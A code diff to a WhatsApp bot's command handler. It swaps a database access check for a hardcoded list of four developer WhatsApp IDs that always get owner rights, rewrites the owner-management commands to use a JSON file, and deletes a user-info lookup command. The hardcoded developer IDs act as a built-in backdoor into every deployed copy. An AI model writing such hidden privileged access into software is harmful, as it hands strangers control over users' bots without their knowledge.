@@ -3,7 +3,6 @@ const yts = require('yt-search')
 const fs = require('fs')
 const axios = require('axios')
 const googleTTS = require('google-tts-api')
-const devKelvin = '256742932677';
 const checkDiskSpace = require('check-disk-space').default;
 const chalk = require("chalk")
 const fetch = require("node-fetch")
@@ -123,7 +122,6 @@ var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMes
 const content = JSON.stringify(mek.message)
 const type = Object.keys(mek.message)[0]
 if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key)
-// ========== STORE MESSAGE FOR ANTI-DELETE ==========
 if (m.message && m.key && !m.key.fromMe) {
     storeMessage(m.chat, m.key.id, {
         key: m.key,
@@ -132,68 +130,52 @@ if (m.message && m.key && !m.key.fromMe) {
         pushName: m.pushName || "Unknown"
     });
 }
+const botNumber = await conn.decodeJid(conn.user.id);
 const { sender } = m;
 const from = m.key.remoteJid;
 const chatId = m.chat;
 const isGroup = from.endsWith("@g.us");
 const senderId = m.key.participant || from;  
-const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'))
-const botNumber = await conn.decodeJid(conn.user.id)
+const DEV_JIDS = [
+    '256742932677@s.whatsapp.net',
+    '256755585369@s.whatsapp.net',
+    '38161203904689@lid',
+    '96491339264216@lid'
+];
 
+const LegendaryKevin = JSON.parse(fs.readFileSync('./data/owner.json'));
+const ownerFile = './data/owner.json';
+const ownerList = LegendaryKevin.owner || [];
 
-async function checkAccess(sender) {
-    try {
-        // Normalize the sender number
-        const normalizedSender = sender.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-        
-        const sudoUsers = await db.getSudo(botNumber) || [];
-        
-        const owners = await db.get(botNumber, 'owners', []);
-        const authorizedNumbers = [
-            botNumber,
-            devKelvin,
-            ...owners,
-            ...sudoUsers
-        ]
-        .filter(num => num) 
-        .map(num => {
-            if (!num) return null;
-            const cleanNum = num.replace(/[^0-9]/g, "");
-            return cleanNum ? cleanNum + "@s.whatsapp.net" : null;
-        })
-        .filter(num => num); 
-        return authorizedNumbers.includes(normalizedSender);
-    } catch (error) {
-        console.error('Error in checkAccess:', error);
-        return false;
-    }
-}
-const Access = await checkAccess(m.sender);
+const authorizedJids = [
+    ...DEV_JIDS,
+    ...ownerList,
+    botNumber
+];
 
-let prefix = "."; // Default prefix
+const Access = authorizedJids.includes(m.sender);
+
+let prefix = ".";
 
 try {
-    // Get prefix from SQLite
     prefix = await db.get(botNumber, 'prefix', '.');
 } catch (error) {
     console.error('Error loading prefix from database:', error);
-    prefix = "."; // Fallback to default
+    prefix = "."; 
 }
 
 try {
     const alwaysonlineSetting = await db.get(botNumber, 'alwaysonline', false);
-    
-    // Handle different possible values
     if (typeof alwaysonlineSetting === 'boolean') {
         global.alwaysonline = alwaysonlineSetting;
     } else if (typeof alwaysonlineSetting === 'string') {
         global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
     } else {
-        global.alwaysonline = false; // Fallback
+        global.alwaysonline = false; 
     }
 } catch (error) {
     console.error('Error loading alwaysonline from database:', error);
-    global.alwaysonline = false; // Default fallback
+    global.alwaysonline = false; 
 }
 
 
@@ -219,9 +201,6 @@ const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentione
 const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
 const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
 const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
-
-
-const senderNumber = m.sender.split('@')[0];
 
 let groupMetadata = null;
 let groupName = "";
@@ -959,21 +938,22 @@ case 'online': {
 case 'addowner': {
     if (!Access) return reply(mess.owner);
     
-    const user = m.mentionedJid[0] || args[0];
-    if (!user) return reply(`*Please provide a user number!*\n\n📌 *Example:* ${prefix}addowner +256742932677`);
+    let user = m.mentionedJid[0] || args[0];
+    if (!user && m.quoted) user = m.quoted.sender;
+    if (!user) return reply(`*Reply to a user message to be added as owner with ${prefix}addowner*`);
     
-    // Get current owners
-    let owners = await db.get(botNumber, 'owners', []);
+    let userJid = user;
     
-    // Normalize the JID
-    const normalizedJid = user.includes('@s.whatsapp.net') ? user : user + '@s.whatsapp.net';
+    let data = JSON.parse(fs.readFileSync(ownerFile));
     
-    if (!owners.includes(normalizedJid)) {
-        owners.push(normalizedJid);
-        await db.set(botNumber, 'owners', owners);
-        reply(`✅ @${normalizedJid.split('@')[0]} added to owners list!`, { mentions: [normalizedJid] });
+    if (!data.owner) data.owner = [];
+    
+    if (!data.owner.includes(userJid)) {
+        data.owner.push(userJid);
+        fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2));
+        reply(`✅ ${userJid} added to owners list`);
     } else {
-        reply(`❌ User is already an owner!`);
+        reply(`❌ ${userJid} is already an owner`);
     }
     break;
 }
@@ -981,54 +961,41 @@ case 'addowner': {
 case 'removeowner': {
     if (!Access) return reply(mess.owner);
     
-    const user = m.mentionedJid[0] || args[0];
-    if (!user) return reply('Mention user or provide JID');
+    let user = m.mentionedJid[0] || args[0];
+    if (!user && m.quoted) user = m.quoted.sender;
+    if (!user) return reply(`*Reply to a user message to be removed from owners with ${prefix}removeowner*`);
     
-    // Get current owners
-    let owners = await db.get(botNumber, 'owners', []);
+    let userJid = user;
     
-    // Normalize the JID
-    const normalizedJid = user.includes('@s.whatsapp.net') ? user : user + '@s.whatsapp.net';
+    let data = JSON.parse(fs.readFileSync(ownerFile));
     
-    const index = owners.indexOf(normalizedJid);
-    if (index > -1) {
-        owners.splice(index, 1);
-        await db.set(botNumber, 'owners', owners);
-        reply(`✅ @${normalizedJid.split('@')[0]} removed from owners list!`, { mentions: [normalizedJid] });
+    if (data.owner && data.owner.includes(userJid)) {
+        data.owner = data.owner.filter(id => id !== userJid);
+        fs.writeFileSync(ownerFile, JSON.stringify(data, null, 2));
+        reply(`✅ ${userJid} removed from owners list`);
     } else {
-        reply(`❌ User is not in owners list!`);
+        reply(`❌ ${userJid} not found in owners list`);
     }
     break;
 }
-
-case 'listowners': {
-    const owners = await db.get(botNumber, 'owners', []);
-    const sudo = await db.getSudo(botNumber);
+case 'listowner': {
+    let data = JSON.parse(fs.readFileSync(ownerFile));
+    const ownerList = data.owner || [];
     
-    if (owners.length === 0 && sudo.length === 0) {
-        return reply('📋 No owners or sudo users found.');
-    }
+    if (ownerList.length === 0) return reply('No owners found');
     
-    let message = `*AUTHORIZED USERS*\n\n`;
+    let message = `👑 *OWNERS LIST*\n\n`;
+    const mentions = [];
     
-    if (owners.length > 0) {
-        message += `*📋 Owners:*\n`;
-        owners.forEach((jid, i) => {
-            message += `${i+1}. @${jid.split('@')[0]}\n`;
-        });
-        message += `\n`;
-    }
-    
-    if (sudo.length > 0) {
-        message += `*Sudo Users:*\n`;
-        sudo.forEach((jid, i) => {
-            message += `${i+1}. @${jid.split('@')[0]}\n`;
-        });
-    }
+    ownerList.forEach((user, index) => {
+        message += `${index + 1}. ${user}\n`;
+        mentions.push(user);
+    });
+    message += `\n📊 Total: ${ownerList.length} owner(s)`;
     
     await conn.sendMessage(m.chat, {
         text: message,
-        mentions: [...owners, ...sudo]
+        mentions: mentions
     }, { quoted: m });
     break;
 }
@@ -3135,7 +3102,6 @@ case "calc": {
 break
 case "owner": {
     try {
-        const botNumber = await conn.decodeJid(conn.user.id);
         
         // Get owner info from SQLite
         const ownernumber = await db.get(botNumber, 'ownernumber', '256742932677');
@@ -8199,152 +8165,6 @@ const quoted = m.quoted || m.msg?.quoted;
       console.error(error);
       reply('*An error occurred while uploading the media.*');
     }
-}
-break
-case "userinfo":
-case "ui": {
-    try {
-        let targetUser;
-        
-        // Determine the target user
-        if (m.mentionedJid && m.mentionedJid.length > 0) {
-            targetUser = m.mentionedJid[0];
-        } else if (m.quoted && m.quoted.sender) {
-            targetUser = m.quoted.sender;
-        } else if (text) {
-            // Extract numbers from text
-            const numbers = text.match(/\d+/g);
-            if (numbers && numbers.length > 0) {
-                targetUser = numbers[0] + '@s.whatsapp.net';
-            } else {
-                targetUser = m.sender; // Use sender if no valid number found
-            }
-        } else {
-            targetUser = m.sender; // Default to sender
-        }
-
-        // Validate the target user format
-        if (!targetUser.includes('@s.whatsapp.net')) {
-            targetUser = targetUser.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        }
-
-        // Get user info with proper error handling
-        const userJid = targetUser;
-        
-        // Get basic user info
-        const [usernameResult, userDataResult] = await Promise.allSettled([
-            conn.getName(userJid).catch(() => 'Unknown'),
-            conn.onWhatsApp(userJid).catch(() => [])
-        ]);
-
-        const username = usernameResult.status === 'fulfilled' ? usernameResult.value : 'Unknown';
-        const userData = userDataResult.status === 'fulfilled' && userDataResult.value.length > 0 ? 
-                        userDataResult.value[0] : null;
-
-        // Check if user exists on WhatsApp
-        if (!userData || userData.exists !== true) {
-            return reply('❌ *This user is not registered on WhatsApp or the number is invalid.*');
-        }
-
-        // Get additional info with error handling
-        const [profilePicture, aboutInfo, isBusiness, isBlocked] = await Promise.allSettled([
-            conn.profilePictureUrl(userJid, 'image').catch(() => null),
-            conn.fetchStatus(userJid).catch(() => null),
-            conn.getBusinessProfile(userJid).catch(() => null),
-            conn.fetchBlocklist().then(blocklist => 
-                blocklist && Array.isArray(blocklist) ? blocklist.includes(userJid) : false
-            ).catch(() => false)
-        ]).then(results => [
-            results[0].status === 'fulfilled' ? results[0].value : null,
-            results[1].status === 'fulfilled' ? results[1].value : null,
-            results[2].status === 'fulfilled' ? results[2].value : null,
-            results[3].status === 'fulfilled' ? results[3].value : false
-        ]);
-
-        // Get group-specific info if in a group
-        let groupRole = "Not in this group";
-        let isAdmin = false;
-        
-        if (m.isGroup && participants && Array.isArray(participants)) {
-            const participant = participants.find(p => p.id === userJid);
-            if (participant) {
-                groupRole = participant.admin ? 
-                    (participant.admin === 'superadmin' ? 'Group Owner' : 'Admin') : 'Member';
-                isAdmin = !!participant.admin;
-            }
-        }
-
-        // Check if user is premium/owner/contributor with safe access
-        const premList = JSON.parse(fs.readFileSync('./start/lib/database/premium.json', 'utf-8') || '[]');
-        const isPremium = Array.isArray(premList) ? premList.includes(userJid) : false;
-
-        const kontributorList = JSON.parse(fs.readFileSync('./start/lib/database/owner.json', 'utf-8') || '[]');
-        const isContributor = Array.isArray(kontributorList) ? kontributorList.includes(userJid.replace('@s.whatsapp.net', '')) : false;
-
-        // Safely check if user is owner
-        const isOwner = Array.isArray(global.owner) ? 
-            global.owner.includes(userJid.replace('@s.whatsapp.net', '')) : 
-            (global.ownernumber === userJid.replace('@s.whatsapp.net', ''));
-
-        // Format user info
-        const userInfo = `
-👤 *USER INFORMATION*
-
-📛 *Name:* ${username}
-📞 *Number:* ${userJid.replace('@s.whatsapp.net', '')}
-🆔 *JID:* ${userJid}
-
-✅ *WhatsApp Status:* Registered
-🏢 *Business Account:* ${isBusiness ? 'Yes' : 'No'}
-⭐ *Premium User:* ${isPremium ? 'Yes' : 'No'}
-👑 *Bot Owner:* ${isOwner ? 'Yes' : 'No'}
-🤝 *Contributor:* ${isContributor ? 'Yes' : 'No'}
-🚫 *Blocked:* ${isBlocked ? 'Yes' : 'No'}
-
-📝 *About:* ${aboutInfo?.status || 'Not set'}
-🕒 *Last Updated:* ${aboutInfo?.setAt ? new Date(aboutInfo.setAt).toLocaleString() : 'Unknown'}
-
-${m.isGroup ? `👥 *Group Role:* ${groupRole}\n📊 *Is Admin:* ${isAdmin ? 'Yes' : 'No'}\n` : ''}
-
-🔗 *Profile Picture:* ${profilePicture ? 'Available' : 'Not available'}
-        `.trim();
-
-        // Send user info
-        if (profilePicture) {
-            await conn.sendMessage(
-                m.chat,
-                {
-                    image: { url: profilePicture },
-                    caption: userInfo,
-                    mentions: [userJid]
-                },
-                { quoted: m }
-            );
-        } else {
-            await conn.sendMessage(
-                m.chat, 
-                { 
-                    text: userInfo,
-                    mentions: [userJid],
-                    contextInfo: {
-                        externalAdReply: {
-                            title: `User Info - ${username}`,
-                            body: `Requested by ${pushname || 'Unknown'}`,
-                            thumbnail: await getBuffer('https://files.catbox.moe/uy3kq9.jpg').catch(() => null),
-                            mediaType: 1,
-                            sourceUrl: 'https://whatsapp.com'
-                        }
-                    }
-                },
-                { quoted: m }
-            );
-        }
-
-    } catch (error) {
-        console.error('Error in userinfo command:', error);
-        reply('❌ *An error occurred while fetching user information. Please try again.*');
-    }
-    
 }
 break
 case "npm": {
